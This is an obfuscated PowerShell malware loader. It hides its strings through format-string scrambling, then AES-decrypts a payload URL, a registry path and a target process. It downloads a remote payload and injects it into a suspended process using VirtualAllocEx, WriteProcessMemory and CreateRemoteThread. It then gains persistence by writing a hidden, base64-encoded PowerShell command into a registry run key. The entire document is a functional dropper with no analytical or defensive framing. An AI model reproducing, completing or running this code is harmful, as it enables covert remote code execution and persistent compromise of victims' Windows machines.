# -------------------------------
# PowerShell statements are fine here
[System.Threading.Thread]::CurrentThread.CurrentCulture = [System.Globalization.CultureInfo]::InvariantCulture
[System.Threading.Thread]::CurrentThread.CurrentUICulture = [System.Globalization.CultureInfo]::InvariantCulture
$ErrorActionPreference = ("{4}{3}{0}{1}{2}"-f'Co','ntinu','e','tly','Silen')

function fnCalc {
    $seg = 100
    $inc = 4.0 / $seg
    $acc = 0.0
    for ($i = 0; $i -lt $seg; $i++) {
        $x = $i * $inc
        $acc += ($x * $x) * $inc
    }
    $dPart = 12.0
    $sum = $acc + $dPart
    return [math]::Round($sum, 5).ToString().Replace('.', '')
}

$lineA = ("{4}{0}{5}{6}{3}{7}{1}{2}"-f'_','_x','of','o_s','god','yzal_eht_re','v','pmuj')
$lineB = ("{2}{3}{0}{1}"-f '_k','ciuq_','_nw','orb')
$lineC = "eht"
$all = $lineA + $lineB + $lineC

function fnKey($calcVal, $ss) {
    $combo = $calcVal + $ss
    if ($combo.Length -lt 16) { $combo += "0" * (16 - $combo.Length) }
    return [Text.Encoding]::UTF8.GetBytes($combo.Substring(0, 16))
}

$z = fnCalc
$k = fnKey $z $all
$v = New-Object Byte[](16)

function fnDec {
    param(
        [string]$c,
        [byte[]]$kk,
        [byte[]]$iv
    )
    [byte[]]$raw = [Convert]::FromBase64String($c)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $kk
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec = $aes.CreateDecryptor()
    [byte[]]$out = $dec.TransformFinalBlock($raw, 0, $raw.Length)
    $aes.Dispose()
    return [Text.Encoding]::UTF8.GetString($out)
}

$a1 = ("{3}{8}{6}{7}{15}{14}{10}{11}{0}{13}{4}{9}{12}{2}{16}{5}{1}" -f'Y7FfkKMAYtj','=','TFB','ab','Aph/oN','z2bk','v','GM6h','S53UumAg9vCxjFw9mYKX','gHraeQz8R+olyl/Pj6fr9t4lbg1ZKMAL','pIo','F','wTSxJ','VK','4seEOUOuz','J','O8n')
$a2 = ("{11}{0}{2}{1}{10}{7}{4}{13}{12}{9}{5}{8}{6}{3}{14}" -f 'lq','hBfXcBCcw7LN','m2','/','HPw2DbXw','pJdFHR','w','xHFEEZJF','4L','Kq','Vk6E5J','/l2lk3','9jkJKlNOguXgTl21hSqjMx6l','iJrO','Mw==')
$a3 = ("{6}{9}{7}{8}{10}{3}{5}{4}{1}{2}{0}"-f'tx7U=','Rfn85','US','SHhxScI','WoC','+TfU','bzu','ugf2V','0kP','v8','juOqD')
$a4 = ("{2}{3}{8}{4}{1}{6}{9}{0}{5}{7}"-f '9jhg7k3o','iuRgqd','IdXv','h','CU9z9p','hxiz','L7rs2','o=','xg','PAVbCA')

try {
    $u  = fnDec -c $a1 -kk $k -iv $v  
    $rp = fnDec -c $a2 -kk $k -iv $v 
    $px = fnDec -c $a3 -kk $k -iv $v  
    $rv = fnDec -c $a4 -kk $k -iv $v  
} catch {
    return
}

# -----------------------------------------------------------------
# EMBEDDED C# CODE GOES IN AN ADD-TYPE BLOCK:
# -----------------------------------------------------------------
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class xR {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine,
        IntPtr lpProcessAttributes, 
        IntPtr lpThreadAttributes, 
        bool bInheritHandles,
        uint dwCreationFlags, 
        IntPtr lpEnvironment, 
        string lpCurrentDirectory,
        ref SI lpStartupInfo, 
        out PI lpProcessInformation
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, 
        IntPtr lpAddress,
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        int nSize, 
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        out IntPtr lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct SI {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PI {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    public static bool zQ(byte[] pl, string tx) {
        SI si = new SI();
        si.cb = (uint)Marshal.SizeOf(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;
        PI pi = new PI();
        uint cf = 0x08000000 | 0x4; 
        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
        if(!ok) return false;
        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
        if(addr == IntPtr.Zero) return false;
        IntPtr tmp;
        bool wr = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out tmp);
        if(!wr || (int)tmp != pl.Length) return false;
        IntPtr thrId;
        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out thrId);
        if(thr == IntPtr.Zero) return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@

try {
    $wc = New-Object System.Net.WebClient
    [byte[]]$payload = $wc.DownloadData($u)
    if ($payload -and $payload.Length -gt 0) {
        [xR]::zQ($payload, $px) | Out-Null
    }
} catch {
    return
}

# Another chunk of embedded C# => but it's put inside a separate Add-Type or it’s pure PS code
# (But in your script, you have it as a separate PowerShell script that uses the same injection technique.)
# If it's a second code block, do it like below:

$st = @'
param([string]$u, [string]$p)
try {
  $wc = New-Object System.Net.WebClient
  [byte[]]$b = $wc.DownloadData($u)
  Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class xR {
   // ... same approach for code injection ...
}
"@
  [xR]::zQ($b, $p) | Out-Null
} catch {}
'@

$stB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($st))
$rcmd = ('powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ' + "$stB64 " + '-u `"$u`" -p `"$px`"')

try {
    New-ItemProperty -Path $rp -Name $rv -Value $rcmd -PropertyType String -Force | Out-Null
} catch {}
# -------------- END SCRIPT --------------
